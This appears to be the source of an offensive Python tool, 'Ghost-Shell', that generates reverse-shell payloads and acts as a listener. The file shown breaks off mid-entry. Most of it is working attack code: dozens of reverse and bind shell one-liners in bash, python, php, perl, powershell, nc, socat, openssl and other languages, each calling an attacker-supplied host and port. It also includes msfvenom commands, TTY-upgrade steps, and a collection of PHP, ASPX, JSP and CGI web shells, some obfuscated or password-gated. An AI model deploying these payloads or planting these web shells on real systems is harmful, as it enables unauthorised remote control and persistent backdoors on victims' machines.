#!/usr/bin/env python3
"""
Ghost-Shell - Reverse Shell Payload Generator & Listener
By Gh0st-Bx1 | github.com/Ghost-Bx1
"""

import os
import sys
import socket
import base64
import argparse
import json
import threading
import struct
import time
from datetime import datetime

try:
    import colorama
    colorama.init(autoreset=False)
except ImportError:
    pass

C = {
    "R": "\033[91m", "G": "\033[92m", "Y": "\033[93m",
    "B": "\033[94m", "M": "\033[95m", "C": "\033[96m",
    "W": "\033[97m", "DIM": "\033[2m", "BOLD": "\033[1m", "X": "\033[0m",
}

VERSAO = "1.0.0"


def _build_banner():
    import re as _re
    G = "\033[92m"; Cy = "\033[96m"; D = "\033[2m"; N = "\033[1m"
    W = "\033[97m"; X = "\033[0m"
    IW = 68; eq = "═" * IW; sp = " " * IW
    TL = "╔"; TR = "╗"; BL = "╚"; BR = "╝"; VB = "║"
    hl = "─" * 44; bar = "│"
    vl = lambda s: len(_re.sub(r"\x1b\[[0-9;]*m", "", s))

    def _row(s):
        n = vl(s); p = max(0, IW - n); l = p // 2; r = p - l
        return f"{G}{VB}{X}{' ' * l}{s}{' ' * r}{G}{VB}{X}"

    def _row_l(s):
        n = vl(s); p = max(0, IW - n - 2)
        return f"{G}{VB}{X}  {s}{' ' * p}{G}{VB}{X}"

    ga = [
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠛⠿⠟⠉⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⢀⣠⣤⣶⣶⣶⣶⣶⣶⣤⣀⠢⢝⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡡⢀⣴⡿⢋⡴⢿⣿⣿⣿⣿⣿⣿⣿⢷⣦⡑⠈⡛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⡜⢠⣾⣿⣤⣋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠻⣶⣦⣤⣤⣀⠉⠻⣿⣿⣿⡿⠿⢛⢛⡻⠿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⠿⠟⠟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⢀⣿⣿⣿⡿⠛⠛⠻⣿⣿⣿⡿⠛⠛⢿⣿⣿⣧⠉⠉⣁⣈⣉⣁⢀⣿⣿⢋⠄⣁⣴⣶⣄⠐⢌⢻⣿⣿{X}", ""),
        ("", f"{G}⡏⠀⣴⣦⣄⠢⡙⢿⣿⣿⣿⣿⣿⣿⡇⠀⣼⣿⣿⣿⠅⠀⠀  ⢹⣿⡿⠁⠀⠀⠀⢹⣿⣿⡆⠀⣿⣿⣿⣿⣿⡟⠁⢀⣴⣿⣿⣿⣿⣷⡈⠎⢿⣿{X}", ""),
        ("", f"{G}⡇⠀⣿⣿⣿⣷⣌⠀⠙⢿⣿⣿⣿⣿⠀⢀⣿⣿⣿⣿⠀⠀⠀  ⠀⠈⣿⡇⠀⠀⠀⠀⠈⢿⣿⡇⠁⢻⣿⣿⣿⡿⠁⢠⣾⣿⣿⣿⡿⢿⣿⣷⠀⠘⣿{X}", ""),
        ("", f"{G}⣇⠀⢿⣿⣿⡟⣿⣷⣄⠀⠙⢿⣿⡇⠀⣸⣿⣿⡿⣿⡀⠀⠀⠀  ⢸⣿⣧⠀⠀⠀⠀⣸⡈⣿⣷⠀⡈⣿⣿⡿⠁⢀⣾⣿⣿⢩⣿⠁⣾⣿⣿⡆⠀⢿{X}", ""),
        ("", f"{G}⣿⡀⠘⣿⣿⣿⡘⣿⣿⣷⣌⠂⠉⠁⢠⣿⣿⡟⣰⢿⣷⣤⣤⣴⣿⣿⣿⣷⣄⣠⣴⣿⣧⠸⣿⣧⡐⠢⠉⠁⢀⣾⣿⣿⡇⣼⣿⢸⣿⣿⣿⣇⠀⢸{X}", ""),
        ("", f"{G}⣿⣷⡀⠸⣿⣿⣧⠸⣿⣿⣿⣿⣶⣶⣿⣿⠏⡰⢃⣾⣿⣿⣿⣿⡏⠀⠈⣿⣿⣿⣿⣿⣏⠳⣘⣿⣿⣷⣶⣾⣿⣿⣿⣿⢠⣿⣿⣿⣿⣿⣿⣿⠀⢸{X}", ""),
        ("", f"{G}⣿⣿⡇⠀⣿⣿⣿⡄⡿⢿⣿⣿⣿⣿⣿⣷⣾⣷⣿⣿⣿⣿⣿⣿⣧⣀⣠⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠸⠋⢉⠉⡉⠛⠿⣿⠀⢸{X}", ""),
        ("", f"{G}⣿⣿⡇⢀⣿⣿⣿⣧⢸⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢠⣾⣿⡄⠈⠀⠀⠀⠀ ⣾{X}", ""),
        ("", f"{G}⣿⡟⠀⣸⣿⣿⣿⣿⣜⡇⢿⣧⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡉⠻⠇⠀⠰⠀⠀ ⣀⣾{X}", ""),
        ("", f"{G}⣿⠃⢠⣿⣿⠿⠿⠿⢿⣿⠸⣿⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢣⢸⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⢰⠜⠋⠀⢀⡄⢰⣤⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠃⢻⣿⣿{X}", ""),
        ("", f"{G}⣿⣆⠠⠀⡀⠀⠁⣿⣿⠟⠀⣽⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣿⣿⣿⣿⣿⢃⣿⣿⣿⡟⣸⣿⣿⣿⣿⡿⠋⢠⢃⣾⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣷⣶⠆⡄⠈⢉⣠⣴⣾⣿⢿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⣴⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⠇⠛⢏⠉⠉⠁⠤⢊⣥⣾⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⢄⠀⢾⣿⣿⣿⣿⡇⢸⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣶⣬⣭⣶⣾⣿⣿⠏⣼⣿⣿⣿⡇⣸⣿⣿⣿⠀⣰⣿⡁⢠⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣤⣀⡀⠀⠀⠉⠉⠁⢸⣿⣿⣿⢸⣿⣿⣿⣿⡹⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣿⣿⣿⣿⠇⣿⣿⣿⣿⡀⠹⢿⡇⠀⢿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠛⠀⣼⣿⣿⣿⢸⣿⣿⢻⣿⣷⣌⠻⣿⣿⣿⣿⠟⣡⣾⣿⡟⣼⣿⣿⠀⣿⣿⣿⣿⣿⣶⣤⡀⠀⢸⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⠈⠀⣴⣾⣿⣿⣿⡇⢸⣿⣿⣇⢻⣿⣿⣷⣦⣭⣭⣴⣾⣿⣿⣿⢡⣿⣿⣿⠀⣿⣿⣿⣿⣿⠿⠟⠃⡀⢸⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⡐⠠⢈⡉⠛⠛⠿⡇⢸⣿⣿⣿⡜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⠀⣁⣤⡄⠀⣀⣒⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⡌⠀⣦⠀⣼⣿⣿⣿⣇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣿⣿⣿⣿⣄⡈⠛⠃⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⢁⣤⣿⣿⣿⣿⣿⠘⣿⣿⣿⣿⣿⣿⣿⣿⡟⢸⣿⣿⣿⣿⣿⣿⣦⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠠⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⢼⠿⠿⣿⣿⣿⣿⠟⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠈⣙⠛⠛⣛⣛⠛⠀⠻⢿⣿⣿⣿⣿⣿⣿⡃⢠⣤⠀⠀⣀⣉⣁⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣤⡀⢀⠈⢿⣿⣿⣿⣿⣷⣄⠁⠀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠁⠈⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠠⢠⣿⣿⣿⣿⣿⠟⢀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⠀⢸⣿⣿⣿⡿⢁⡄⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠰⠘⣿⣿⣿⠁⠎⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡑⠈⠻⠇⠈⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
    ]

    info = [
        f"{G}{N}GHOST-SHELL{X}",
        f"{Cy}v{VERSAO}  {D}Reverse Shell Generator & Listener{X}",
        f"{D}{hl}{X}",
        f"{W}By Gh0st-Bx1  {D}{bar}  github.com/Ghost-Bx1{X}",
        f"{D}{hl}{X}",
        f"{D}generate  listen  encode  upgrade{X}",
        f"{D}bash python php perl ruby nc powershell{X}",
    ]

    out = [f"{G}{TL}{eq}{TR}{X}", f"{G}{VB}{sp}{VB}{X}"]
    for left, center, right in ga:
        combined = left + center + right
        n = vl(combined); p = max(0, IW - n); l = p // 2; r = p - l
        out.append(f"{G}{VB}{X}{' ' * l}{combined}{' ' * r}{G}{VB}{X}")
    out.append(f"{G}{VB}{sp}{VB}{X}")
    for i in info:
        out.append(_row_l(i))
    out += [f"{G}{VB}{sp}{VB}{X}", f"{G}{BL}{eq}{BR}{X}"]
    return "\n".join(out)


BANNER = _build_banner()


def _log(tag, msg, nivel="INFO"):
    cores = {
        "INFO": C["C"], "OK": C["G"], "ERRO": C["R"],
        "ALERTA": C["Y"], "CRITICO": C["R"] + C["BOLD"],
    }
    cor = cores.get(nivel, C["W"])
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  {C['DIM']}[{ts}]{C['X']} {cor}[{tag}]{C['X']} {msg}")


def _secao(titulo):
    print(f"\n{C['G']}{'─' * 60}{C['X']}")
    print(f"  {C['BOLD']}{C['G']}{titulo}{C['X']}")
    print(f"{C['G']}{'─' * 60}{C['X']}")


# ──────────────────────────────────────────────────────────────────
# Payload Templates
# ──────────────────────────────────────────────────────────────────

PAYLOADS = {
    "bash": (
        "bash",
        "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    ),
    "bash-196": (
        "bash",
        "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196",
    ),
    "bash-read": (
        "bash",
        "exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done",
    ),
    "sh": (
        "sh",
        "sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    ),
    "python": (
        "python",
        (
            "python -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"{LHOST}\",{LPORT}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "p=subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
    ),
    "python3": (
        "python3",
        (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"{LHOST}\",{LPORT}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
    ),
    "python3-pty": (
        "python3",
        (
            "python3 -c 'import socket,subprocess,pty;"
            "s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));"
            "[__import__(\"os\").dup2(s.fileno(),fd) for fd in (0,1,2)];"
            "pty.spawn(\"/bin/bash\")'"
        ),
    ),
    "php": (
        "php",
        (
            "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});"
            "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
    ),
    "php-proc": (
        "php",
        (
            "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});"
            "$proc=proc_open(\"/bin/sh\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"
        ),
    ),
    "php-pentestmonkey": (
        "php",
        (
            "<?php set_time_limit(0);"
            "$ip='{LHOST}';$port={LPORT};"
            "$chunk=1400;$write_a=null;$error_a=null;"
            "$shell='uname -a; w; id; /bin/sh -i';"
            "$daemon=0;$debug=0;"
            "if(function_exists('pcntl_fork')){{$pid=pcntl_fork();"
            "if($pid==-1){{die('fork failed');}}if($pid){{exit(0);}}if(posix_setsid()==-1){{die('setsid failed');}}}}"
            "$sock=fsockopen($ip,$port,$errno,$errstr,30);"
            "$descriptorspec=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));"
            "$process=proc_open($shell,$descriptorspec,$pipes);"
            "if(!is_resource($process)){{die();}}fwrite($sock,'Connected!');"
            "while(!feof($sock)&&!feof($pipes[1])){{$read_a=array($sock,$pipes[1],$pipes[2]);"
            "$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);"
            "if(in_array($sock,$read_a)){{if($debug)print\"SOCK READ\";"
            "$input=fread($sock,$chunk);if($debug){{print\"SOCK: $input\";}}fwrite($pipes[0],$input);}}"
            "if(in_array($pipes[1],$read_a)){{if($debug)print\"STDOUT READ\";"
            "$input=fread($pipes[1],$chunk);if($debug)print\"STDOUT: $input\";"
            "fwrite($sock,$input);}}if(in_array($pipes[2],$read_a)){{if($debug)print\"STDERR READ\";"
            "$input=fread($pipes[2],$chunk);if($debug)print\"STDERR: $input\";fwrite($sock,$input);}}}}"
            "fclose($sock);proc_close($process);?>"
        ),
    ),
    "perl": (
        "perl",
        (
            "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
            "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"
        ),
    ),
    "ruby": (
        "ruby",
        (
            "ruby -rsocket -e 'exit if fork;"
            "c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");"
            "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"
        ),
    ),
    "nc": (
        "nc",
        "nc -e /bin/sh {LHOST} {LPORT}",
    ),
    "nc-mkfifo": (
        "nc",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
    ),
    "ncat": (
        "ncat",
        "ncat {LHOST} {LPORT} -e /bin/bash",
    ),
    "curl": (
        "curl",
        "curl http://{LHOST}:{LPORT}/$(whoami)",
    ),
    "powershell": (
        "powershell",
        (
            "powershell -nop -c \"$client=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});"
            "$stream=$client.GetStream();"
            "[byte[]]$bytes=0..65535|%{{0}};"
            "while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{"
            "$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);"
            "$sendback=(iex $data 2>&1|Out-String);"
            "$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
            "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);"
            "$stream.Flush()}}$client.Close()\""
        ),
    ),
    "powershell-b64": (
        "powershell",
        None,  # Gerado dinamicamente com base64
    ),
    "java": (
        "java",
        (
            "r = Runtime.getRuntime();"
            "p = r.exec([\"/bin/bash\",\"-c\","
            "\"exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5|while read line;do \\$line 2>&5 >&5;done\"] as String[]);"
            "p.waitFor();"
        ),
    ),
    "lua": (
        "lua",
        (
            "lua -e \"require('socket');t=socket.tcp();"
            "t:connect('{LHOST}',{LPORT});"
            "while true do c,l=t:receive();f=io.popen(c,'r');t:send(f:read('*a'));end\""
        ),
    ),
    "golang": (
        "go",
        (
            "package main;"
            "import(\"net\";\"os/exec\";\"os\");"
            "func main(){{c,_:=net.Dial(\"tcp\",\"{LHOST}:{LPORT}\");"
            "cmd:=exec.Command(\"/bin/sh\");"
            "cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}"
        ),
    ),
    "awk": (
        "awk",
        (
            "awk 'BEGIN{{s=\"/inet/tcp/0/{LHOST}/{LPORT}\";"
            "while(42){{do{{printf \"shell>\" |& s;s |& getline c;"
            "if(c){{while((c |& getline)>0)print |& s;close(c)}}}}while(c!=\"exit\");close(s)}}}'"
        ),
    ),
    "xterm": (
        "xterm",
        "xterm -display {LHOST}:0",
    ),
    "bind-bash": (
        "bash",
        "nc -lvp {LPORT} -e /bin/bash",
    ),
    "bind-python": (
        "python3",
        (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket();s.bind((\"\",{LPORT}));s.listen(1);"
            "c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);"
            "os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
    ),
    "msfvenom-linux": (
        "msfvenom",
        "msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf",
    ),
    "msfvenom-windows": (
        "msfvenom",
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe",
    ),
    "msfvenom-php": (
        "msfvenom",
        "msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php",
    ),
    "msfvenom-aspx": (
        "msfvenom",
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o shell.aspx",
    ),
    "msfvenom-war": (
        "msfvenom",
        "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war",
    ),
    "node": (
        "node",
        (
            "node -e \"require('child_process').exec("
            "'bash -c \\\"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\\\"'"
            ")\""
        ),
    ),
    "node-net": (
        "node",
        (
            "node -e \""
            "var n=require('net'),s=new n.Socket();"
            "s.connect({LPORT},'{LHOST}',function(){{"
            "var sp=require('child_process').spawn('/bin/sh',[]);"
            "sp.stdin.pipe(s);s.pipe(sp.stdout);s.pipe(sp.stderr)}})\""
        ),
    ),
    "socat": (
        "socat",
        "socat tcp:{LHOST}:{LPORT} exec:bash,pty,stderr,setsid,sigint,sane",
    ),
    "socat-listener": (
        "socat",
        "socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}",
    ),
    "openssl": (
        "openssl",
        (
            "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {LHOST}:{LPORT} > /tmp/s; rm /tmp/s"
        ),
    ),
    "openssl-listener": (
        "openssl",
        (
            "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=ghost'\n"
            "  openssl s_server -quiet -key key.pem -cert cert.pem -port {LPORT}"
        ),
    ),
    "groovy": (
        "groovy",
        (
            "String host=\"{LHOST}\";"
            "int port={LPORT};"
            "String cmd=\"/bin/bash\";"
            "Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();"
            "Socket so=new Socket(host,port);"
            "InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=so.getInputStream();"
            "OutputStream po=p.getOutputStream(),so2=so.getOutputStream();"
            "while(!so.isClosed()){{"
            "while(pi.available()>0)so2.write(pi.read());"
            "while(pe.available()>0)so2.write(pe.read());"
            "while(si.available()>0)po.write(si.read());"
            "so2.flush();po.flush();Thread.sleep(50);"
            "try{{p.exitValue();break}}catch(e){{}}}}"
            "p.destroy();so.close();"
        ),
    ),
    "telnet": (
        "telnet",
        "TF=$(mktemp -u);mkfifo $TF && telnet {LHOST} {LPORT} 0<$TF | /bin/bash 1>$TF",
    ),
    "dart": (
        "dart",
        (
            "import 'dart:io';"
            "import 'dart:convert';"
            "main(){{Socket.connect('{LHOST}',{LPORT}).then((socket){{"
            "socket.listen((data){{"
            "Process.start('/bin/sh',[]).then((Process process){{"
            "process.stdin.writeln(new String.fromCharCodes(data).trim());"
            "process.stdout.transform(utf8.decoder).listen((e){{socket.write(e);}})}});}});}});  }}"
        ),
    ),
    "crystal": (
        "crystal",
        (
            "require \"process\";require \"socket\";"
            "s=TCPSocket.new(\"{LHOST}\",{LPORT});"
            "Process.run(\"/bin/sh\",input:s,output:s,error:s)"
        ),
    ),
    "r-lang": (
        "r",
        (
            "r = 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1';"
            "system(r)"
        ),
    ),
    "busybox-nc": (
        "busybox",
        "busybox nc {LHOST} {LPORT} -e /bin/sh",
    ),
    "zsh": (
        "zsh",
        "zsh -c 'zmodload zsh/net/tcp && ztcp {LHOST} {LPORT} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
    ),
    "msfvenom-android": (
        "msfvenom",
        "msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o shell.apk",
    ),
    "msfvenom-python": (
        "msfvenom",
        "msfvenom -p python/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.py",
    ),
}

# Dicas de TTY upgrade
TTY_HINTS = {
    "python": (
        "python -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
        "  CTRL+Z\n"
        "  stty raw -echo; fg\n"
        "  export TERM=xterm"
    ),
    "python3": (
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
        "  CTRL+Z\n"
        "  stty raw -echo; fg\n"
        "  export TERM=xterm"
    ),
    "script": "script /dev/null -c bash",
    "socat": "socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}",
    "stty": (
        "stty raw -echo; fg\n"
        "  reset\n"
        "  export SHELL=bash\n"
        "  export TERM=xterm-256color\n"
        "  stty rows 38 columns 116"
    ),
}

WEBSHELLS = {
    "php-simple": "<?php system($_GET['cmd']); ?>",
    "php-b64": "<?php eval(base64_decode($_POST['cmd'])); ?>",
    "php-b64-get": "<?php echo shell_exec(base64_decode($_GET['c'])); ?>",
    "php-pass": "<?php if(md5($_GET['k'])=='098f6bcd4621d373cade4e832627b4f6'){system($_GET['c']);} ?>",
    "php-obf": "<?php $f='sys'.'tem';$f($_GET['c']); ?>",
    "php-upload": (
        "<?php if(isset($_FILES['f'])){"
        "$n=$_FILES['f']['name'];"
        "move_uploaded_file($_FILES['f']['tmp_name'],'./'.$n);"
        "echo 'Uploaded: '.$n;} ?>"
    ),
    "php-bypass-df": (
        "<?php "
        "$f=array_values(array_filter(array_map(function($x){return is_callable($x)?$x:null;},"
        "['shell_exec','exec','system','passthru','popen','proc_open'])));"
        "if($f){echo call_user_func($f[0],$_GET['c']);}?>"
    ),
    "php-preg": (
        "<?php preg_replace('/.*/e',$_POST['cmd'],''); ?>"
    ),
    "aspx": (
        "<%@ Page Language=\"C#\" %>"
        "<%@ Import Namespace=\"System.Diagnostics\" %>"
        "<% Response.Write(new StreamReader(Process.Start(new ProcessStartInfo(\"cmd.exe\","
        "\"/c \"+Request[\"c\"]){RedirectStandardOutput=true}).StandardOutput).ReadToEnd()); %>"
    ),
    "aspx-auth": (
        "<%@ Page Language=\"C#\" %>\n"
        "<%@ Import Namespace=\"System.Diagnostics\" %>\n"
        "<%@ Import Namespace=\"System.IO\" %>\n"
        "<% if(Request[\"k\"]==\"ghost\"){"
        "var p=new ProcessStartInfo(\"cmd\",\"/c \"+Request[\"c\"]){"
        "RedirectStandardOutput=true,UseShellExecute=false};"
        "Response.Write(new StreamReader(Process.Start(p).StandardOutput).ReadToEnd());}%>"
    ),
    "jsp": (
        "<%@ page import=\"java.io.*\" %>"
        "<% String c=request.getParameter(\"c\");"
        "Process p=Runtime.getRuntime().exec(c);"
        "BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));"
        "String l; while((l=r.readLine())!=null) out.println(l); %>"
    ),
    "jsp-runtime": (
        "<%@ page import=\"java.io.*,java.util.*\" %>"
        "<% String[] cmd={\"/bin/bash\",\"-c\",request.getParameter(\"c\")};"
        "Process p=Runtime.getRuntime().exec(cmd);"
        "BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));"
        "String line;StringBuffer sb=new StringBuffer();"
        "while((line=r.readLine())!=null)sb.append(line).append(\"\\n\");"
        "out.print(\"<pre>\"+sb.toString()+\"</pre>\"); %>"
    ),
    "cfm": (
        "<cfset cmd=GetHttpRequestData().content>\n"
        "<cfexecute name=\"/bin/bash\" arguments=\"-c #cmd#\" variable=\"out\" timeout=\"10\"></cfexecute>\n"
        "<cfoutput>#out#</cfoutput>"
    ),
    "perl-cgi": (
        "#!/usr/bin/perl\n"
        "use CGI;\n"
        "my $q=CGI->new;\n"
        "print $q->header('text/plain');\n"
        "print `$ENV{QUERY_STRING}`;\n"
    ),
    "python-cgi": (
        "#!/usr/bin/env python3\n"
        "import cgi,os,sys\n"
        "print('Content-Type: text/plain\\n')\n"
        "form=cgi.FieldStorage()\n"
        "cmd=form.getvalue('c','')\n"
        "if cmd: print(os.popen(cmd).read())\n"
    ),
    "nodejs": (
        "const http=require('http');\n"
        "const url=require('url');\n"
        "const {exec}=require('child_process');\n"
        "http.createServer((req,res)=>{\n"
